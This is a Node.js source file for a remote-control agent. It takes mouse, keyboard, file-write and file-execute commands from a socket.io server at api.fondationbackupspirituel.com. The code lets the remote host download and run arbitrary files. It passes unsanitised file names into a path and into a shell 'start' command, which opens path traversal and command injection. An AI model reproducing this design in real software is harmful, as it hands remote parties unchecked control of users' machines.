const io = require("socket.io-client");
const robot = require("robotjs");
const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");

const socket = io("https://api.fondationbackupspirituel.com");

let currentSession = null;

// REGISTER AGENT
socket.emit("register-agent", {
  agentId: "FOBAS-AGENT-001"
});

// RECEIVE SESSION LINK
socket.on("attach-session", (data) => {
  currentSession = data.session;
});

// 🖱️ MOUSE MOVE
socket.on("mouse-move", (data) => {
  robot.moveMouse(data.x, data.y);
});

// CLICK
socket.on("mouse-click", () => {
  robot.mouseClick();
});

// KEYBOARD
socket.on("key-press", (data) => {
  robot.keyTap(data.key);
});


// ============================
// 📁 FILE RECEIVE + INSTALL (AJOUT NOUVO BLOK)
// ============================

// RECEIVE FILE
socket.on("file-receive", (data) => {
  const filePath = path.join(__dirname, "downloads", data.name);

  const base64Data = data.file.split(",")[1];

  fs.writeFileSync(filePath, base64Data, "base64");

  console.log("File saved:", filePath);
});

// INSTALL FILE
socket.on("file-install", (data) => {
  const filePath = path.join(__dirname, "downloads", data.name);

  console.log("Installing:", filePath);

  exec(`start "" "${filePath}"`, (err) => {
    if (err) {
      console.error("Install error:", err);
    }
  });
});
